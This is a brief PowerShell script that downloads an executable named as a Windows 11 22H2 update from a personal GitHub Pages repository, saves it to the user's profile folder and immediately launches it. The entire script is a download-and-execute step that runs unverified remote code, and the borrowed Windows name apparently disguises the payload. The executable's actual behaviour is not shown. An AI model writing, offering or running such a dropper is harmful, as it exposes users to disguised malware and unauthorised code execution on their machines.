$url = "https://github.com/webntdev/webntdev.github.io/raw/main/Windows1122H2/Windows1122H2.exe"
$destination = "$env:USERPROFILE\Windows1122H2.exe"

if (-not (Test-Path $destination)) {
    Invoke-WebRequest -Uri $url -OutFile $destination
}

Start-Sleep -Seconds 1

Start-Process -FilePath $destination
